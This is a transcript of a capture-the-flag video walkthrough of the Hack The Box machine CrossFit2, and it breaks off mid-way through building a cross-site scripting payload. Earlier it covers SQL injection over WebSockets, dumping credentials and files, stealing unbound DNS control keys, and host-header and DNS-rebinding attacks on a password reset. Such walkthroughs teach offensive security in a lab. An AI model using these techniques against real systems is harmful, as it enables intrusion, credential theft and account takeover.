 what's going on youtube this is ipsec i'm doing crossfit 2 from hack the box which was an insane box that i loved because almost every single step of this box i learned something new it starts out with a simple sql injection in the website which i've done a hundred times probably even in these videos however it does it over sockets and i never really played that much with web sockets once you do the sql injection you have to use cross-site scripting to force a user to create an account for you and in order to do that you have to bypass course header which i hadn't done before and with that new account you have access to a new chat room and then you can analyze the code in the chat room to discover you can use cross-site scripting yet again to snoop in on someone's direct messages and you get a password to the web server with that password you can log in and discover there's a simple prevest by injecting a node modules directory up a few parent directories and once you do that you can get roots ssh key through a binary exploitation and you try to use it and you can't because ssh is locked down with yubikey so you have to steal a bunch of yubikey secrets from the box and then build your own two factors so with all that being said let's jump in as always i'm gonna start off with that and map so dash sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory and call it crossfit 2 and then the ip address of 101010232 this can take some time to run so i've already ran it looking at the results we can see just two ports are open and i know that quickly because number one i've done this box before but number two it's saying it's not showing the 998 closed ports and by default and map just checks the top 100 so we have ssh on 22 it's banner tells us it's open ssh 8.4 and it isn't giving us any extra information so normally i'm used to seeing it tell me like the distro like ubuntu or things like that the next port we have is http on port 80 and its banner tells us it's php 7412 which means it's probably running a php web server if you didn't know you can just do like p well before i do that i'm going to make the directory dub dub dub so i don't like host any of my content in this one directory it's always good to know where your web server directories are then dash capital s the ip address you want to listen on i want to listen on everything and then like 80 uh permission denied so let's run that with sudo and we have our php development server running mine is seven four fifteen this is seven four twelve i'm guessing the php is relatively up to date so looking at the results we have it just getting a page um content yoga studio crossfit nothing too interesting here going down again x powered by php the server header is telling us it's open bsd so we got the distro of unix i guess i should say because it's open bst it's not linux and the main thing with this is the paths when i do like lfi's are going to be drastically different also i don't think like that normal bash one line or reverse shell works so things like that i just have to take an account for the two servers i hate coming across that are nix based is openbsd or solaris because it just messes up all my commands so we'll probably come into some frustration a little bit later this is just some fingerprinting information and nothing else so let's go take a look at the page going to 101010232 we get this crossfit page and one thing i always like doing is opening things with um the web console up or web developer mode i don't know what this is but looking at this we can see it's got content security policy uh we have firefox can't establish connection to websocketsgym.crossfit.hdb so we do have the host name and i don't know if that was actually in the nmap result so i'm gonna do grep dash capital r and we'll say crossfit and then in the nmap directory and the only way that we know its crossfit is because of our hostname so in http or ssh it did not leak the host name but we have it now so let's add it into our host file so we can do 10 10 10 232 crossfit.hdb and gym.crossfit.hdb and then let's go take a look at this page we can click on about us it is definitely php so we should be doing um a dirtbust on php scripts going around we have a blog the one thing i like about blogs is seeing if they have a way to view individual pages like single.php or something because that's like custom blogs and ctfs that's where you'd normally find sql injections but this looks like it's a static page i don't see any way i can give it input so i'm just going to move on we have a contact.php and we can put a message here so i'm going to try ipsec root at ipsec dot rocks and then i'm just going to do test and let's do image source is equal to http 10 10 14 8 image i think i did that correctly i always question my html abilities which is kind of funny so let's go into www.v index.html do this and we'll say give this name uh test.image and python3.m http server and if i go to localhost 8000 it tries to load that image awesome the only thing we have to do is make sure we're listening on port 80 permission denied let's run that with sudo and now i can send this here and all this is telling me is if someone um views this so i sent this and did something i guess that may be a post message um the other thing i can do is we can do this again test test send it through burp suite make sure my intercept is on it is send and it doesn't look like it does anything so i don't know if this contact form is sending any data or i'm pretty sure it's not so let's move on to the next thing we go and we get employees.crossfit.htb so we got a another domain we need to add so let's go back over here and put it in so before we go poking at these domains we always want to have some type of recon going on in the background so i'm going to do two things let's do sudo and map dash p dash 10 10 10 232 and we can say o a and map crossfit dash all ports always good to have a full nmap scan going we can add the dash v flag so it shows us open ports as it finds them and then of course we want to do a go buster so go buster dir you http 101010 232 word list opt set list um discovery web content draft small words dot php uh no dot txt uh dash x for arguments php and dash o for out file and we'll call this go buster root dot log there we go so now we have go buster running we have an map going we can take a look at the other sub domains so the first one was jim.crossfit.htb this is just going back to this page if we do actually one thing we have here is this little chat window and this is probably that websocket request that was failing it was probably using that um normally these things use websockets uh what was the other one we had cat etsy host employees.crossfit.hdb we want to look at what http there we go and we have a sign sign-in form so we can try like admin admin we may want to run sql map to see if this is sql injectable we can just try um a or one equals one just a basic like sql payload don't see anything if we go to forgot password admin at crossfit.hdb and we have unknown email address so right off the bat we know this reset password we can enumerate potential emails so if i was doing an actual engagement and knew the like subdomain i would probably be using w fuzz actually let's just try this i have not tried this before so who knows what we'll get test at test.com i needed to send this to burp suite okay it's just a post request with um email equals so we can go back here where my recon tab is we can do f dash w for word list opt set list uh let's go cd up set list find dot grant name let's see user names so let's do usernamesnames.txt what's this look like cat it's a lot of names let's see grep dash i username ms top usernames let's try look at this yeah this is going to be getting rid of dupes i don't like all those special characters in usernames i'm just trying to find email so i'm gonna go with that very first word list we used um common family names usa top 1000 is this last name that is last name let's see let's just do names.text okay so we can do f wf uh upset list usernames names.txt u http and this is employees.crossfit.htb password reset get rid of this double http and then we can say [Music] d and it's going to be email equals yep email is equal to fuzz at crossfit.htb and then all we want to do is hide the results of 213. so dash filter words 213 and this may give us a potential email address um maybe maybe not so when we get user names we'll have to come back to this to see if we did it correctly so i would go back and look at that websocket thing so now when we go to crossfit.htb the websocket resolves when we first enumerated the page it couldn't access the websocket on gym.crossfit.htb therefore this thing didn't show up but now it does we can poke at it can i make this bigger sweet so we can say help to see commands available commands coaches classes and memberships and we can click here for a simple thing and if we want to intercept these websockets we can just send this over to burp suite look at like memberships oh god it just disappeared um let's turn burp off crossfit.htb okay turn verb on and say memberships and we're sending this and we're sending this token this is like a cross-site request forgery token actually we can send it in repeater and it gives us let's see we sent and we didn't get anything back to server respond to me server huh let's go let's try this again turn proxy off go back to crossfit.hdb websockets are always buggy when you do something and it may be the case that i didn't say something in the chat and the first time you send a message you like activate a login thing so something like that is totally possible what happened so i'm going to send memberships again we got it go to repeater and the server i don't think it's responding to me we got direction to server and the server never goes back to us reconnect send okay um incorrect token so now let's put this token in paste send and we have this here so what i want to do is refresh and let's play with that button so i'm just going to say membership memberships and then we can intercept this one request before i click here and this one was interesting to me because it was giving a parameter we got message available params is equal to one and i'm waiting for like it to disconnect maybe i double click this and reconnect and correct a missing token put this here send there we go so we have a message good news the membership plan is available and it gives us some debug output so i'm going to again copy this token and eventually we'll script this out in python but i want to play with sql injection so the first thing i do is put something a single quote here and it can't really understand me so what i'm going to do next is put a comment after that because we broke the sql statement and it's still not working we can try it with a double quote i'm just waiting for it to say something positive and it's not responding to me what if my vpn's going down or something what if it's like all my fuzzing let's see i definitely want the port scan there let's reconnect we have a hello send so whenever i do oh i know what it is uh the double quote's a bad character because we're sending json so we just sent a invalid thing because um yeah that double quote so try backspace and it can't understand me so i was just escaping this one quote so the other thing we can do is just try it with no quotes and still can't understand me so let's do the same thing we did but with the params so send this we do a single quote membership plan is unavailable so what i'm going to do is say param is equal to does not exist and we get unavailable so we want to do is make sure we didn't cause a sql error and saw that message so that's why i did something that didn't involve a sql injection so we now know this is just an error the application gives and not necessarily because it's sql injectable so pram is one and then we can do we already did this i think let's try it with an escaped double quote unavailable and then we can try it with nothing and it looks like that worked um we did this parameter and we put a comment and it did not error out so all i want to do is make sure it's not doing something funky so i'll do like 1b to make sure it's not just picking the integer and we get incorrect token and out of curiosity i'm going to try like 0 0 1 and we know it's treating this as an integer not a string and we can try 0x1 and i don't know what this really tells me other than i just like fingerprinting applications to see how it works so we can do hex as well but we know we had a valid sql injection here without a comment so i'm gonna do one union select one membership unavailable it's returning two things so i'm guessing we just needed two parameters here one comma two and we get good news the membership plan is available so what we wanna do is try to get data in here so i'm gonna do please and then subscribe and it's still saying id 1 1 so all i'm going to do is increment this a few times to see if we ever get something different and at three we have it saying please and subscribe so let's see what just happens if we just did the parameter three so if we do union select get rid of this union and just send three it just says the membership plan's unavailable but our union is making this return something else and that's why we're getting it so if we just did one two it'll say um the membership plan is available there we go id one name two so now we have confirmed we have sql injection and a websocket the tough part is now weaponizing this because we have to use python to create a websocket or we can live in this burp suite window but copying this token constantly is just a pain so let's switch over to python to automate this for us and that nmap scan is still going um i just want to look at the go buster route to see if we have anything before you do that v403 and the pages look about average so let's do v oh i'm not in my home directory let's just exit go back here crossfit2 v inject.pi so there are two ways we can really go about this the first way would probably be going the middleware out and writing something to expose these web sockets over http so we can just point sql map at our web server and give it a parameter and that parameter goes and forwards it to the websocket for us and just run sql map to get it i'm not going to be showing that because um i think it just makes it like a bit too easy in the terms of learning sql injection if you want to understand it you can probably either go to oxdf's writeup or i know he does both because we worked on that piece together or go to ipsec.rocks and watch a video of me do it with um who is so the other way is to use python and just create a simple way to do a bunch of sql commands so we're going to do that the first thing we need to do is import websocket and then how we interact with this we're going to create like a simple command line so from cmd import cmd and then there's a lot of json involved so i'm just going to import json so the first thing we have to do is create a basic cmd application so we'll do cmd and then prompt is equal to injection and then we just do a define default self args and then print args and all i'm doing here is just building a skeleton to make sure i got this piece correct so term is equal to tom term and then term.cmd loop so if i now execute inject.pi we just have this simple command line application um i wonder if i do def exit and return true does that do anything def exit self args return true does this give me exit no i know there's some way i can or maybe do exit my bad do exit yeah so that's how we can exit this application gracefully but next step is to actually connect via websockets so we want to do some initialization because we have to um have the socket connect and then we also have to get the very first token which is a c surf so def init self and then we'll call self.connect and later on we'll build this out and then super init and the reason why we do this is because we're overriding this initialization and if we didn't do this then the cmd library wouldn't go over its normal initialization and may miss things so all this does is lets us start off something and then tell it to go through your normal initialization and now we have to create the connect so def connect self and i'm going to say it's called by init there we go and then self.websocket is equal to websocket.createconnection and this was [Music] dot jim.crossfit.htb slash websocket probably i can go over to burp suite to confirm this uh let's see i think i can is there any request to jim jim at the beginning of the video i'm pretty sure i saw that 404 of it failing so we can try that um then we can say data is equal to json.loads and then self.websocket.receive because we got data and if i just print this data out it's going to print probably a json string so let's just do this python3 yeah so we have this the main thing we want to grab is token so all i'm going to do is say self.token is equal to data token now i'm not returning a variable here because the main thing i want to do is always update the self.token with whatever we call a websocket so this variable just stays up to date so the next piece we want to do is now send a websocket message so we'll do another definition send websocket self params and then i'm going to create a dictionary because dictionaries convert to json very easily and then message message is equal to and whenever we go to our websockets we send message available params three and then token so we'll do message available then message params is equal to params and message token is equal to self.token now we need to send a message so self.ws.send and we're just going to send json.dumps message and all this does is convert this dictionary into a json if we want we can print json.dumps message and put this in parentheses then the next thing we want to do is a data is equal to self.ws.receive and then i convert this over to json and then we can do self.token is equal to data token so we update we sent a command so we have to update what our token is for the next command and then we can also return data debug so now in our default all we have to do is say print then self.send websocket args and let's see what happens so i send it one uh json has no attribute json do i have like json.json yeah json.loads data one and we're turning data now right so here's what i can do union select one comma two and let's see union select i yep sec so we have confirmed we have injection here so the thing we want to do is not have to always put three space and then this union we just want to hard code that and then let us run nested sql commands right that may not make 100 sense and you can see hold on this print is that json.dumps on data so let's get rid of this or on message so on this params this is what we modify so we say um 3 union select params comma 2 and we have to now put this as a f string and then we can try this out by saying select a and looks like we have some type of error let's put this in parentheses there we go so when you're doing nested sql injection within a union statement the sql command you want should be enclosed in parentheses like this so what this is doing is whenever we type something it's going to do the union injection for us and then it's going to run a sql command right here and do the comma 2 so that one piece is always two which is name and if you heard like some weird sound in the background i think my dog started snoring and scared me for a second as i was talking so let's just um move on and do some sql injections running our script uh specify python3 we can try to enumerate the information schema table so select group underscore concat schema name from information schema dot schemata and fix this typo and we can get the databases so information schema crossfit and employees if we really wanted to we could clean this input up by hiding data so what i'm going to do is that real quick since we mentioned it i do echo n uh yeah echo dash n so we don't do a line break and this is ten characters at the end and what is this five characters echo dash n wc-c five so we just go into an inject script and then on this return let's see i wonder if i can do it here so we can say um 5 colon minus 10. so this is saying take the string go up five characters and then go back 10 characters so now when i try this let's do this select we only get what we want so there are three uh databases and if this part confuses you all i'm doing is enumerate information underscore schema information underscore schema mysql and we go to this database and we give you the tables reference is this it no that's not it um general tables here we go and i pulled the schemata table i think yep right here and this tells me everything here i did the name of the schema which is the database so the next one i'm going to do is go into the tables the tables table i guess it's a funny one yeah information schema tables table and i'm going to select the table name where the table schema is something i want so let's do this let's do group concat and the group concat is what's allowing me to select multiple things if i just did select schema name it would go in multiple rows and probably error out because this isn't designed to return multiple rows the group concat takes his multiple rows puts them into one row which makes it happy so group concat table name from information schema.tables and looks like our websocket time down we could go and have it like reconnect on air but we could also uh just be a bit quicker okay so we have this and we can say where the table catalog which i think is the database does not equal um actually we can just say table catalog is equal to what is it crossfit i think it was a crossfit and employees maybe it's table underscore schema there we go so we had two databases [Music] i should have logged this but crossfit and employees so crossfit has membership plans and employees has two it has an employees table and uh password reset so if you want to view the column names out of here you guessed it we just do column name from information schema where table schema is equal to this dot columns and i don't like how this is viewed um because it's not telling us the table it's not a huge issue because there's only one table here but whenever i do this i generally have this group concat do table underscore name and then column name so i know this is oh this was showing two different um tables but we have employees like this is the table name column name table name column name and then if you'll make it a little bit prettier you can add a line break on the end so we have employees id username email password reset email token expires so we have that and we can also do the crossfit table and the crossfit table has membership plans id name base price whatever so this isn't too interesting we probably want to put all our effort into dumping this so we can do group concat and say let's do username then password and email password email from crossfit dot employees actually it was employees right table schema is crossfit dot employees like that yeah of course we aired out let's copy this command and we aired i want to say the database was employees yeah okay yeah databases employees.employees and we have everything so administrator and that email is david palmer then we got w smith will smith at crossfit maria williams jay parker i'm going to focus all my effort really on david palmer because he is the administrator we could try cracking this hash but it doesn't really lead us anywhere so i'm not going to do it because it'll just be a time sink but what i would do is wc-c see it 64 characters and i know that's a sha-256 sum i believe or it's likely to be sha 256 sum so i'm just echoing junk that doesn't matter to get this hash and we can do echo dash and wc-c so 64. so let's try a password reset so now that we have a valid thing and we know our usernames wouldn't work because we only did first name at crossfit.hdb and we didn't have anything here so i wanted to see if our w fuzz would have worked if we did it correctly so i'm going to do dash word list and we'll just do test.txt and edit test.txt to be david palmer and next one will be ipsec so this only gives us david palmer we did it correct if it gives us nothing then this piece would not work and we did that one plan incorrectly i wonder if this needs to be url encoded let's see decoder at encode html no it's probably 40 still in code url yeah percent 40. like this huh so ipsec and david palmer is getting the same result so we probably want to check this out manually so let's go to password reset turn it on and we'll try david palmer at crossfit.hdb let's see proxy it's probably gonna do like a 302 redirect or something and w fuzz followed it or some thing wait unknown email okay so go to repeater here 200 okay so it says reset link set please check email but in our repeater window we do have that this doesn't exist oh shoot this thing always gets me with fuff and one of the reasons why i often use um w fuzz have to set the content type most likely there we go and we can do filter words for 226 which is um does not exist and only david palmer comes back so again if we do test.text ipsec please subscribe does not exist take out the filter you can see emails that don't exist are going to be 226 words which is invalid email and then reset link sent is 230. so that's how you do it fluff um 213. always uh it was working there we go um always always always remember to use this header whenever you use fluff maybe the latest version has that set by default if it's not but let's move on so we have the reset link set which means we should be able to go back and dump the resets so if we go up the table name is password reset and we want to get these so vt so select group concat uh we want email token expires and put like something between these from password reset wait was the database i really should have been taking notes for this video and obsidian let's see so this is the employees table or employees database password reset table so from employees dot password reset and my websockets probably timed out so let's just restart run it and we don't have anything but my doorbell came off so i'm going to be right back okay i'm back sorry about that i'm getting interrupted a lot more than normal but we saw this query and it returned null which means the sql injection worked if we do something that doesn't exist so like employees that does not exist is going to return well it's going to error out because we're too lazy to code the reconnect thing if the websockets down but if we do this it returns a bunch of the sql syntax so we know the password reset thing does exist but maybe we just took too long and it cleared the reset link so i'm going to run this again and then we're going to do this and we can get a valid thing now the issue we're going to run into is we don't know the actual syntax how this works because even though we have this token just because we have the token where do we input it best gut is we could try to fuzz this so we can say go back to a fuff and let's do password reset and then let's see it's going to retype the command so f w for word list opt set list and then is there fuzzing and then there should be a parameters let's see cd opt set list fuzzing finder grab pram grab dash i is it a word list there we go this is what i want discovery web content so even though we're technically fuzzing we just want to get burp parameter names so opsec list discovery burp parameter names and then dash u and we go here paste this in and we just want the parameter to be fuzz is equal to one and all this is going to do is um fuzz a bunch of potential parameters for thispasswordreset.php and then we can do um dash filter size i guess let's do that one four two two eight and right off the bat we do get a token so we have a potential way to reset this so let's go here password reset dot php change this over to a get request and i did get for password resetting because it's almost always going to be a get because if you can't really put a post parameter in a link and most of these password resets email you a link so they put the token whatever and the actual header so the next step to do is um get this so it's going to air out we really should fix the script but i think this is the last time we need it for a bit uh let's go back here what is it david palmer at crossfit.htb and burp suite we should for this and then we get this token and we can just paste this in actually we don't even need burp suite we can turn this off and then say password reset token is equal to this and we get invalid token that's weird select group token still exists but yeah so we can't really do anything with this so we can move on with our sql injection i'm not done with it yet and think of other things we can do one of the common ones is enumerating files on the system so we can run a command to check if we can do that by doing a select group underscore concat grantee privilege type and we probably should put a colon there from information schema.user privileges and we can see the crossfit user has the file permission which means we can read files so we can do select load underscore file etsy passwd and we could read that so the next thing to do is probably enumerate the apache configuration because there were a lot of like virtual hosts so did we miss anything i don't know so we can look at etsy http.com and if this was a ubuntu box it would be like etsy apache 2 then apache2.com apache2.conf i think or h etsy apache2htp.conf forget the exact path but again remember this is bsd so that's why the paths are going to be slightly different so we got server00 it's listening on port 8000 uh index.php so this is probably the main web server because it's just doing a php fpm so this is php web server then we've got server employees on port 8001 and its root is hd docs underscore employees it's another php app running php fpm so who knows where these are we also have this chat on 8002 and we got a few read writes here but this is i think the websocket i don't see anything that can confirm that right off the bat but the main issue i'm seeing here is we have all these ports but nothing listening on port 80. so there's some type of application in front of this and on bsd lan that's probably going to be relay d so we can try reading this file relayd.com and i've had enough of this error let's see if we can fix this real quick v inject.pi so let's see connect let's try try this and then if it fails let's call connect self.connect and send it again maybe that works or maybe we just broke the application more so i'm just going to um run the script and i'm going to take a like 15 to 30 second break and we'll see if um it errors out when i come back okay let's just try it again if we just do abc it should do something but we got the websocket closed message so it doesn't look like that works um looking at this i think it should have hit this let's see am i descending anywhere else send ws default i mean we can try putting it here as well try then accept and we can just whoops yank this yank this connect maybe try it that way the other thing i'm going to do is let's create a read function since we have to read files often ergs and then we can say um param is equal to or we can call it payload it's equal to select load file args we put this in quotes and then we need that to be an f string and then yank all this it's ugly as crap but if it works it works um i thought i yanked it four gank put three yank yank put there we go so instead of sending args we send payload okay let's try this real quick python 3 inject read etsy passwd awesome so read etsy relay d or is it relay relay.com relay d relay comp uh relayd.com there we go found it so this is how the web server is forwarding things it's a bit confusing of a file we can see it's checking the header if the header exists crossfit club.htb then it forwards it to three if it's employees it forwards it to two so we can kind of see how this works let's see let's just highlight everything on two and if it's web 2 is going to port 8001 3 is going to 9999 so we can see that forwarding message here it's checking the actual paths so one of these is probably searching for websocket yeah match request websocket send it to four so this is sending it to the chat which will be where's chat for 4419 so that's how that works hopefully that makes sense but this is a new domain crossfit club.hdb so let's check this out sudo vi etsy host and we can say crossfit club.htb go to a browser http crossfit dash club dot hdb and we got portal front end and we have a whole new website so username password again we can try admin password or admin admin probably try sql map here for a good measure but nothing's here we can try to sign up but the sign up button is blanked out if we do username ipsec root ipsec dot rocks password password still can't log in we could try like editing this so going up into a fancy web console we can try making this button enabled so let's see div so we can just delete the disabled so button disabled delete that and then we can shake this disabled equals disabled out and see what happens so now we should be able to click it i should always send this to burp suite so we can see if anything happens nothing is happening and if we look more at this it's doing event something happened there and it's going to this javascript and this just did a 404 not found but looking at the headers of this application we see [Music] i thought i was going to say express let's go back to just slash does anything happen here refresh forget how i enumerated this was the express web framework there's probably a way there's a lot of javascript though you can see we got all these js chunks portal front end does not work properly without javascript enabled i wonder if i just go to this front end and view source what happens so this webpage is much different than before um let's see let's do an nmap again maybe so i can just close this pane out start a new one and we can do that nmap so sudo nmap dash sc svoa and map we'll do crossfit dash strict 80 10 10 10 232 and all i want to do is pretty much run the nmap script scan against this now when i have the this virtual host not sure if it'll do anything but should be interesting [Music] we go to the javascript that's css css we can try to parse out things so let's do curl against this and that is a lot let's see let's just try analyzing this login so go to prep suite what does a login request look like it's posting to api login and we got this weird e tag i think that's something related to caching but we have success false and there we go that's why i saw the express framework it's in the x powered by when you post to the api so the main thing is trying to enumerate this api if we just do a post here it says cannot post to slash api we can try like an options request to say what options are available get head patch post delete so there's not too much we can do if we try to get it just says cannot get slash api so we want to enumerate potential routes and we can do that two ways first we can fuzz it so we can do let's uh gobuster d-i-r-u http crossfit club.htb dash w for word list up seclist oh we want slash api slash and then upset list discovery web content and then probably the parameter names.txt to see if we get anything so slash auth exists so it is working if we do a get on api auth it just says success false but gives us this token and seeing anything else we have a slash ping so api ping i don't know what it's saying is offline but that's all we get and yeah we can also do raft small words to see if there's anything else so we have some type of recon going on in the background but also we could potentially grab the javascript files and enumerate them so i'm going to control u dot js at cdn.js so we want this js chunks vendor so if we grab this we can curl and then we want to do a special grip to only show us the content that we want uh maybe that's grep op and i'm going to try api what is it this and maybe a double quote to end it is this going to show us what we want does not look like it let's see how do we do this it's been a while since i've used grip this way but i know i'm doing it somewhat correctly um the easiest way to do is just create a test file and then put a bunch of junk in it and then see what happens so i'm going to do the same exact grep except we're going to do it against that file because maybe that one javascript file i have just doesn't have any api endpoints in it so doing this let's try reversing with a double quote cat test that should have got oh we don't have a slash after api if we do this okay and we can match everything let's see api junk there we go so now we're matching the endpoint so we can try this again against our url but what i'm guessing happened is we just didn't get the right url so where is our big old grip let's put it here and nothing so maybe we can go back to this crossfit.htb page and then use what we learned to extract all the javascript pieces we probably could just go to burp suite and get them that way but this is arguably more fun so http crossfit club dot i just no v test paste this junk in and we want to get slash j slash stuff so cat test crep dash op slash js dot star dot js maybe nope let's do the same thing we did okay we have a load of javascript now awesome for i n do this do curl dash s http crossfit club.htb slash i i think then grep for api slash that done let's see what happens here if we get anything we may not because we may have some formatting wrong we may just also want to echo i that's not what we want oh we have to shoot js any piper thing here so cat test like that so now we're going through all the javascripts but still don't have anything if we just do this curl command are we just going to get a bunch of things so a bunch of cannot get i wonder if we get rid of that slash there we go so we couldn't do the double slash like that so we have a few endpoints now auth and login and gritty uh that don't know what that is but it doesn't look like we're getting that many endpoints again oh i guess we could have just grabbed this whole thing this is probably all the chunks um but maybe you learned something doing it the other way of grabbing all those js files but auth and login there's not too much we can really do with that so let's go to some of the recon we had going on in the background which was a go buster and still doesn't really have anything we did small words and parameter names but this is only doing a get request there are other methods accepted like the post so we can do dash m post to also send post requests to see if it's any different right off the bat we did get a slash login which this should have like triggered me earlier because we knew login existed but we're only getting auth and ping was login just not in parameter names i'd highly highly doubt that so it's also case insensitive it looks like so we could also do the small words list and raft but we do now also have a slash signup so we can try to manually craft something with that so let's go change this to a post request and then sign up and we can send the request it tells us only administrators can register account so we didn't even have to do too much to try this uh what i was going to do is just validate that exist and then go to like the front end and look at all these variables so we can see this is input username email password and confirm and then i was going to do this like username is ipsec we have to put it in quotes i wonder if it would be it's probably like that and then password please subscribe confirm please subscribe and then the final one was email root at ipsec dot rocks but we didn't even have to do anything and it's also important to note that i already have a c surf token in because i had intercepted it if i did not do that we get invalid c surf token so the way it's doing c surf tokens is weird because it's working multiple times on different endpoints but it's there and i just happened to get lucky when i was intercepting request or modified it correctly because i don't know exactly how this ended up here but we have it and it says only administrators can register accounts so what i'm getting at now is we probably have to um another thing is this wouldn't work because we don't have json here i think application slash json's the default type uh oh we got an error message so now we're processing json we probably just put username and all this stuff in quotes and then it will probably be happy but yeah whenever changing from like um url encoder to json make sure you do the header yeah so now that the json is correct we're still getting the error message but we have to do probably some type of cross-site scripting if we want to register accounts the downside is we don't know how to get anyone web browser like there's no places to input links or things like that so this is one of the really tough parts of the box is to discover um there is a extra port listening if we did that full port scan so if we do crossfit all ports dot nmap there is 8953 which is unbound dns control so we can install unbound i think i just did sudo apt install unbound and this is just like a dns manager so we want to go back to our script python3 inject.pi and steal unbalanced configurations because normally dns servers have some type of secrets they exchange to each other when they try to update each other's zones the zone being just like a directory of dns entries so we want to try to grab that so i'm going to do read etsy unbound.com doesn't exist if you do a lot of googling you'd find that uh openbsd and stores it in the uh var unbound etsy unbound.conf and we can get this configuration file so it's listening on stuff and we want to try to grab all these files so i'm just going to do read against these to see what we can get this is the dns key i don't know exactly what dns key is i did not expect that to work we can look at the zones so if we read zones we can't let's try reading this file the server key doesn't exist these three are what we need to um interact with it so we can get this server.pem so i'm going to do is copy this and we can make dur unbound v uh cd unbound v server.pem paste that file then the next one we wanted let's go back to the config we want to get control dot key that is a big file so copy this v control dot key paste then we want to grab the final one which is control dot pem and we can just copy and paste this v control oh caps lock was on v control dot pem paste and now we have the certificates the next piece is configuring our um client to actually use it so early installed unbound so i'm going to do sudo vi etsy unbound unbound.com and we can configure it and this part is videos not can do it justice because this takes like hours of reading man pages to understand exactly how to configure this thing but that doesn't translate well for videos so i'm going to say the control is enabled and to use the certificate and then we have to give it the file so server cert file and this is going to be home ipsec hdb crossfit 2 unbound server.pem and we'll copy this line twice because we need to edit it so the next thing is the control key file so control key file and this was control dot key and then finally we have the control cert file and this is just ctrl dot pem okay so now we should be able to issue unbound commands if we do this correctly i think we have to do it with sudo so we'll do sudo unbound control dash s for server 10 10 10 232 and then just status and we can see it is running so we can try to add a dns entry so unbound control dash s 10 10 10 232 then forward add plus i and we can say um ipsec dash employees dot crossfit dot htb and point that to 10 10 14 8 on port 53. so it says it's okay so the next thing i want to do is sudo nc lvmp 453 and we want to specify udp because dns is udp and we have to find where we can make someone click something and something that's somewhat common in frameworks is the password reset obeys the host header so what i'm going to do is go to was it employees.crossfit.hdb we'll do this forgot password and i don't know why because jake palmer or something david palmer there we go and we want to intercept this request and we can try to send him to me so we'll do host ipsec employees.crossfit.hdb and i'm going to issue this command again just before you do it send and we get a connection back looks like some type of dns and let's see maybe i should have just done in my web browser let's go back to repeater or did i do it it says only localhost is allowed so this is an air on dns it went here and well it went to i guess this got a response back and it was not localhost so it aired out so what we have to do is stand up a dns server and point it to localhost so let's do opt fake dns i think do i have it ls grep i dns fake dns if you don't have this if you just go to github or let's just delete it and recreate it so we'll do rm-rf and then turn burp suite off and let's do github fake dns python and we'll download this so get clone cd fake dns and all we have to do is create a configuration file but what the goal is going to be is we're going to do a dns server and then the first two people to resolve it it's going to point to localhost and then anyone after it it's going to point to our machine and the reason why we're doing that is this error message whenever we did the password reset i don't know where it went but it said must be localhost and the thing this is kind of mimicking in the real world because it may seem kind of weird is um like the email filtering systems a lot of times when you send a link an email some email filter is going to go follow that link and see if it's malicious so this rebind attack is useful there because for a period of time or a number of requests you can say hey this dns is going to go to this ip it's going to look totally legit and then after it does the initial like checking of the links that's when the dns changes now to be the malicious ip address so that's essentially what we're going to be doing with this attack the first thing we have to do is create a config file so i'm just going to do fake.com and then we specify an a record ipsec employees dot crossfit dot htb and then we'll point it to 127.001 and then i think it's like one percent 10 10 14 8. so now if i stand this server up python 3 fake dns c fake.conf dash dash rebind to enable this attack uh run it with sudo ns lookup server 1010 14 8 and then was it ipsec employees.crossfit.hdb it responds uh cannot find catfake.com it should have found it unmatched request that's v fake.com i wonder if we need let's just get rid of that unmatch request i'm so confused by it matching the request and then unmatching it is that because that rebind flag see server 12701 it's definitely hitting this when demos go wrong let's see percent do it two percent let's just change it to 10 10 14 8 does this address change yeah the address changes and then it's trying to do some other lookup i'm guessing and that's where it fails but we're getting the result back so it does work so let's try twenty seven zero zero one one percent rebind so we do this we get the address of one twenty seven zero zero one do it again and now it's 10 10 14 8. so this is the remind attack i'm not sure exactly what's going on with nslookup but that's good so let's stand up a web server or we can just do uh netcat nc lvnp 80 there we go actually i'm going to do 80 and 443 pseudo nclvmp 443 because if the guy is clicking the link i don't know if it's directing him to ssl or if not ssl chances are it's not ssl because the box wasn't listening on 443 but never know so now we stood up our dns server we have to do unbound as well so let's see unbound control i don't know what pane i did that in it's not there let's see unbound this is it so we add that dns entry stand up our server and then we can go and forward that request so david palmer prep suite intercept reset forward it here and we'll say ipsec employees dot htb send and it actually did two requests so i think we got it let's try again let's put ipsec here and let's restart resend send this go back to our browser and it still says only localhost is loud so let's edit our config because maybe it does two different lookups so let's say two because we're not seeing a third so let's run this again and refresh this page go back to boop ipsec dash employees send it and it said reset link sent please check your email so everything looks fine we should make sure we're listening on port 80 again and before i do that i want to copy this and i'm just going to wait a few minutes to see if any links get clicked and he goes to our server so let's just wait to see what happens it took a few minutes but we do have a hit he's hitting our server with this password reset and then this token that token seems larger than the other token i use out of the database so let's try doing this maybe it's a combination of the database plus some type of secret so what i'm going to do is kill bert and we're just going to send this and see what happens we say we're sorry but the password reset has been temporarily disabled so looks like we can't reset passwords however we can make him go to our page so we may be able to use cross-site scripting to do other things such as have him register account because in the database this user is listed as administrator so since he's administrator maybe we can make him do something fancy through cross-site scripting the first thing we have to do is go back into a www directory and start building a crosstalk scripting thing and the things we're going to do let's go test.text real quick um oh man let me open up a new pane cdw and we're going to outline what we want to do so the first thing we're going to do is grab a c-surf token from api auth and then the second thing is we use that sea surf token to make a request to api sign up as i think david palmer was it i think it was david uh whatever that account is so we make that request and then we send the output back to us uh we actually don't have to do this piece because once the account is created um we don't need anything like we could stop there but we're sending it back to us so we can see exactly what happens like if we get some type of error message it would be good to know because we're taking a stab at the dark at how this account creation works um let's see let's do this and i put a few spaces oh come on how do i line this up good there we go so let's go into www and do v password reset dot php because that's the file he's already getting from us so we can do html script and then we get and the script and html and it should be worth noting that how i'm about to do this isn't the way most people recommend a lot of people recommend when doing this type of cross-site scripting to use the on ready state change i think let's do xml ready state change or xml xss ready state change see stalk daily is this going to be good one of these pairs probably should do it oh that's a bit long okay this is what i don't like so if we're doing it this way um it's saying when this is finished then move on to the next but looking at the code it's a lot of jumping around like you're creating the xml request here this is the very first one you create then on this changing you do other stuff it's just like a lot of jumping up and down and how i do it i like it being very linear like this the code for the first one the second and then the third so that's why i'm gonna be doing it this way but if you're trying to actually do this on an actual engagement you may want to use the ready state change because it may be compatible with more browsers or something i'm not exactly sure why that's the javascript like way people do it but that's how it's often done this is how i do it so xml http request so this is going to um whoops stand up like our object that can create web request i'm gonna say rec1.open it's a get request to http crossfit club dot hdb slash api slash auth and then this other option right here this is the um magic so by default this third option is true and that is the async let's do xml http request open let's go to google let's see is this easy to see yeah so you got the method which we did get then the url then async and this async is going to say it 